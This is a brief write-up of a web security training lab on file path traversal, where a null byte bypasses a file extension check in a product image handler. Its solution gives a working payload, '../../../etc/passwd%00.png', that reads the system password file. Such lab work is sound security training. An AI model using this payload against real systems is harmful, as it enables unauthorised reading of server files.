# Lab 05: File path traversal, validation of file extension with null byte bypass

## Overview:
- Level : PRACTITIONER
- path traversal vulnerability in the display of product images
- End goal: retrieve the contents of the /etc/passwd file.

## Solution:
- ../../../etc/passwd doesn't work
- ../../../etc/passwd%00.png
